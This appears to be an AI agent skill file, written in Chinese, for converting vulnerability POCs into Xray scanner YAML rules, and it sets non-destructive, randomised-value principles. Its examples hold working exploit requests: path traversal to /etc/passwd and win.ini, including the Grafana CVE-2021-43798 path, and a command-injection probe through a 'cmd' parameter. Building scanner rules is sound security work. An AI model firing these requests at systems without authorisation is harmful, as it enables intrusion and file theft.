---
name: xray-poc-converter
description: |
  将互联网上的 POC 内容（如 HTTP 请求包、漏洞描述等）转换为长亭 Xray 可用的 YAML POC 规则。

  触发词：「转POC」「转成xray」「转yaml」「生成POC」「帮我写个xray规则」「从nuclei转」「从goby转」「CVE转POC」

  使用场景：
  1. 将 HTTP 请求包转换为 Xray POC YAML 格式
  2. 根据漏洞描述生成功能完整的 POC
  3. 优化现有 POC 以符合高质量规范
  4. 将其他格式的 POC（如 Nuclei、Goby）转换为 Xray 格式

  支持转换的漏洞类型：文件读取、SQL 注入、命令执行、反序列化、XXE、SSRF、未授权访问等。

  默认输出路径：D:\Tools\xray\pocs
---

# Xray POC 转换器

本 skill 用于将各种格式的 POC 内容转换为长亭 Xray 扫描器可用的 YAML 格式 POC 规则。

## 使用方法

用户可以提供以下格式的 POC 内容：
1. **HTTP 请求包** - 原始的 HTTP 请求文本
2. **漏洞描述** - 文字描述的漏洞信息
3. **其他工具 POC** - 如 Nuclei、Goby、SQLMap 等的 POC 格式
4. **CVE 信息** - CVE 编号和相关描述

## 配置说明

### 默认输出路径

POC 文件默认生成路径：`D:\Tools\xray\pocs`

该路径为 Xray 扫描器的 POC 存放目录，生成的 POC 文件会自动保存到此目录，可直接被 Xray 扫描器加载使用。

**文件命名规范：**
- 格式：`漏洞名称_漏洞类型.yaml`
- 示例：`mete_crm_headimgsave_sqli.yaml`、`nips_users_json_leak.yaml`
- 使用小写字母和下划线
- 包含漏洞类型标识（sqli、rce、file-read、xxe 等）

### 自定义输出路径

如果用户指定了其他输出路径，则使用用户指定的路径。优先级：
1. 用户指定的路径（最高优先级）
2. 默认路径 `D:\Tools\xray\pocs`

## 转换流程

### 1. 分析输入内容

**输入识别规则：**

| 输入格式 | 识别方式 | 对应处理 |
|---------|---------|---------|
| HTTP 请求包 | 首行是 `GET/POST/PUT/DELETE` 等 | 解析请求行+头部+body |
| 漏洞描述文字 | 无 HTTP 结构，纯文字描述 | 提取接口路径+参数+漏洞类型 |
| Nuclei/Goby YAML | 含 `id:` `info:` 等字段 | 提取 path、matchers、type |
| CVE 编号 | 格式为 `CVE-YYYY-NNNNN` | 先搜索漏洞详情再转换 |

**边界处理：**
- 输入为空 → 询问用户「请提供 HTTP 请求包或漏洞描述」
- 输入无法识别类型 → 假设为漏洞描述文本，按「参数+接口+漏洞类型」模式处理
- 不支持的漏洞类型（如逻辑漏洞、DOM XSS）→ 在输出中标注「此漏洞类型暂不支持自动转换，建议手动编写」

### 2. 提取关键信息

从 HTTP 请求中依次提取：

```
Method → 从第一行提取（如 GET、POST）
Path   → 从第一行 / 后提取（如 /api/exec）
Headers → 从请求行下方的键值对提取，保留必要的（Host、Content-Type）
Body   → 从空行后提取（如有）
```

**expression 自动推导规则：**
- 文件读取：`response.body_string.contains(...)` 或 `.matches(...)`
- 命令执行：使用 `randomInt()` 生成随机数，计算后验证结果
- SQL注入：报错型用 `contains(substr(md5(...),...))`，时间盲注用 `latency - r0latency >= ...`
- 未授权访问：结合状态码 + 内容特征

### 3. 生成 POC

根据漏洞类型从 `references/poc_template.md` 选择对应模板，填充提取的信息。

**生成规则：**
- 必须使用 `randomInt()` 生成随机验证值，禁止固定字符串
- 文件读取类必须同时包含 Linux + Windows 两条规则
- 所有 YAML 字段对齐使用空格（2空格缩进）

### 4. 用户确认（检查点）

生成 POC 后，**在写入文件前暂停**，展示：

```
生成的 POC 预览：
---
name: xxx
path: D:\Tools\xray\pocs/xxx.yaml
---

请确认：
1. POC 内容是否正确？
2. 保存路径是否正确？
3. 是否需要调整？

回复「确认」写入，「修改+具体要求」进行调整，「取消」放弃。
```

**危险操作拦截：**
- 如果用户提供的输出路径含系统敏感目录（`/etc/`、`C:\Windows\System32\`）→ 拒绝写入，提示路径无效
- 如果 POC 包含破坏性指令（删除文件、修改配置）→ 拒绝生成，提示违反无害性原则

## POC 结构

```yaml
name: poc-yaml-漏洞名称
transport: http
set:
  # 随机变量定义
rules:
  # 规则定义
expression: |
  # 匹配表达式
detail:
  # 详情信息
```

## 核心原则

转换时必须遵守以下原则：

1. **无害性** - POC 不能执行破坏性操作（删除文件、修改密码等）
2. **随机性** - 使用随机值验证，避免固定值
3. **确定性** - 匹配规则必须唯一确定，避免误报
4. **通用性** - 支持多平台（Linux/Windows）和多版本

## 参考文档

- **POC 模板参考**：[references/poc_template.md](references/poc_template.md)
- **表达式函数**：[references/expression_functions.md](references/expression_functions.md)
- **高质量规范**：[references/best_practices.md](references/best_practices.md)

## 转换示例

### 示例 1：HTTP 请求包转 POC

**输入：**
```http
GET /download?file=../../../etc/passwd HTTP/1.1
Host: target.com
```

**输出：**
```yaml
name: poc-yaml-example-file-read
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd
    expression: |
      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
  r1:
    request:
      cache: true
      method: GET
      path: /download?file=..%2f..%2f..%2f..%2fc:%2fwindows%2fwin.ini
    expression: |
      response.status == 200 && response.body_string.contains("for 16-bit app support")
expression: |
  r0() || r1()
detail:
  author: xray-poc-converter
  links:
    - https://example.com
```

### 示例 2：漏洞描述转 POC

**输入：**
```
某系统存在命令执行漏洞，在 /api/exec 接口，POST 请求，
参数为 cmd，执行命令后返回结果在响应体中。
```

**输出：**
```yaml
name: poc-yaml-example-system-rce
transport: http
set:
  s1: randomInt(100000, 200000)
  s2: randomInt(10000, 20000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /api/exec
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        cmd=expr%20{{s1}}%20-%20{{s2}}
    expression: |
      response.status == 200 && response.body_string.contains(string(s1 - s2))
expression: |
  r0()
detail:
  author: xray-poc-converter
  links: []
```

## 支持的表达式函数

### 字符串操作
- `contains(str)` - 包含字符串
- `matches(regex)` - 正则匹配
- `substr(str, start, length)` - 截取字符串

### 随机/数学
- `randomInt(min, max)` - 随机整数
- `md5(str)` - MD5 哈希

### 响应对象
- `response.status` - HTTP 状态码
- `response.body_string` - 响应体字符串
- `response.body` - 响应体字节
- `response.latency` - 响应延迟

### 示例 3：Nuclei YAML 转 Xray

**输入：**
```yaml
id: CVE-2021-43798-grafana
info:
  name: Grafana File Read
  severity: high
  author: test
  matchers:
    - type: regex
      part: body
      regex:
        - "root:.*?:[0-9]+:[0-9]+:"
```

**输出：**
```yaml
name: poc-yaml-grafana-cve-2021-43798
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
    expression: |
      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
  r1:
    request:
      cache: true
      method: GET
      path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
    expression: |
      response.status == 200 && response.body_string.contains("for 16-bit app support")
expression: |
  r0() || r1()
detail:
  author: xray-poc-converter
  links:
    - https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
```

**Nuclei → Xray 字段映射：**
| Nuclei 字段 | Xray 字段 | 说明 |
|------------|----------|------|
| `id` | `name` | 转为 `poc-yaml-{id}` |
| `info.name` | `detail.description` | 漏洞名称 |
| `matchers[].regex` | `expression` | 正则转 expression |
| `path`（从匹配请求提取） | `rules[].request.path` | 请求路径 |

## 注意事项

1. 转换后的 POC 必须经过测试验证
2. 确保匹配规则的唯一性，避免误报
3. 对于时间盲注，需要设置合理的延迟时间
4. 文件读取类漏洞需要同时支持 Linux 和 Windows
5. 使用随机值时，确保随机范围足够大
6. **POC 文件默认保存到 `D:\Tools\xray\pocs` 目录**
7. 文件命名遵循规范：`漏洞名称_漏洞类型.yaml`
8. 确保生成的 POC 文件符合 Xray 的语法规范
9. 在 detail 部分添加完整的漏洞描述和 FOFA 搜索语法
